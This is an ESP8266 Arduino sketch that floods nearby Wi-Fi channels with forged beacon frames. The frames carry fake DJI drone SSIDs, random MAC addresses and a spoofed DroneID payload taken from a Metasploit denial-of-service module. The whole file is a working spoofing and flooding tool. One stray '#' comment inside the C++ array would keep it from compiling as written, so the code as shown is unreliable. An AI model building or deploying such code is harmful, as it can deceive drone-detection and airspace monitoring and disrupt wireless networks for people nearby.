// original code - https://gist.githubusercontent.com/kost/1e1b13d5796a6649f82ec1c08cd0a835/raw/81b0299a30c36e77f46e57eab8bcd03f77ceb39a/esp8266-wifi-beacon-generator.ino
// esp8266-wifi-beacon-generator by Kost - https://github.com/kost

#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

byte channel;

int maxssids=3; /* how much SSIDs we have */
char *ssids[] = {
      "Mavic-XXXXXX", 
      "Spark-XXXXXX", 
      "Spark-RC-XXXXXX", 
      };

byte rnd;
byte i;
byte count;

// need to swap these bytes out with the ones here - https://github.com/DJISDKUser/metasploit-framework/blob/62e36f1b5c6cae0abed9c86c769bd1656931061c/modules/auxiliary/dos/wifi/droneid.rb#L187
byte wifipkt[128] = { 0x80, 0x00, 0x00, 0x00, 
                /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
                /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                /*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
                /*22*/  0xc0, 0x6c, 
                /*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
                /*32*/  0x64, 0x00, 
                /*34*/  0x01, 0x04, 
                /* SSID */
                /*36*/  0x00};

byte pktsuffix[] = {
                        0x01, 0x08, 0x82, 0x84,
                        0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 
                        0x04,

			# fixedDroneID sample - https://github.com/DJISDKUser/metasploit-framework/blob/62e36f1b5c6cae0abed9c86c769bd1656931061c/modules/auxiliary/dos/wifi/droneid.rb#L93
			0xdd, 0x52, 0x26, 0x37, 0x12, 0x58, 0x62, 0x13, 0x10, 0x01, 0x5a, 0x00, 0xd7, 0x0f, 0x44, 0x72, 0x6f, 0x6e, 0x65, 0x49, 0x44, 0x20, 0x69, 0x73, 0x20, 0x63, 0x72, 0x61, 0x70, 0x21, 0xb0, 0x78, 0x5b, 0x00, 0x29, 0xeb, 0xc2, 0xfe, 0xf6, 0x00, 0xd3, 0x00, 0xd8, 0x00, 0xab, 0x00, 0x3b, 0x00, 0xc0, 0x00, 0xf4, 0x00, 0x40, 0x00, 0x0c, 0x05, 0x3c, 0x00, 0x30, 0x79, 0x2f, 0x01, 0x10, 0x06, 0x31, 0x39, 0x35, 0x37, 0x34, 0x31, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 
};


void setup() {
  delay(500);
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1); 
}

void loop() {

    // Random source and dst mac addresses. 
    wifipkt[10] = wifipkt[16] = random(256);
    wifipkt[11] = wifipkt[17] = random(256);
    wifipkt[12] = wifipkt[18] = random(256);
    wifipkt[13] = wifipkt[19] = random(256);
    wifipkt[14] = wifipkt[20] = random(256);
    wifipkt[15] = wifipkt[21] = random(256);

    count=37;

    rnd=random(maxssids);
    
    wifipkt[count++]=strlen(ssids[rnd]);
    for (i=0; i<strlen(ssids[rnd]); i++) {
      wifipkt[count++]=ssids[rnd][i];
    }
    
    for (i=0; i<sizeof(pktsuffix); i++) {
       wifipkt[count++]=pktsuffix[i];
    }

    channel = random(1,12); 
    wifi_set_channel(channel);
    wifipkt[count-1] = channel;
    
    wifi_send_pkt_freedom(wifipkt, count, 0); // no clue why we are spamming this 3 times here? 
    wifi_send_pkt_freedom(wifipkt, count, 0);
    wifi_send_pkt_freedom(wifipkt, count, 0);
    delay(1);
}
